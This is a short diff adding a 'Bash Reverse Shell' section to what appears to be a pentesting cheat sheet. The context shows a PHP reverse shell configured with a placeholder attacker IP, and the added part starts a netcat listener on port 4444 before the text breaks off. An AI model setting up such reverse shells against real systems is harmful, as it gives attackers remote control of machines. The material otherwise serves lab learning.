@@ -543,3 +543,17 @@ Edit the shell file:
 ```php
 $ip = 'YOUR_KALI_IP';
 $port = 4444;
+```
+<details>
+<summary>🐚 Bash Reverse Shell (Basic)</summary>
+
+### 📌 What is it?
+A reverse shell where the target connects back to your machine using bash.
+
+---
+
+### 🚀 Usage
+
+#### 1. Start listener (your machine)
+```bash
+nc -lvnp 4444
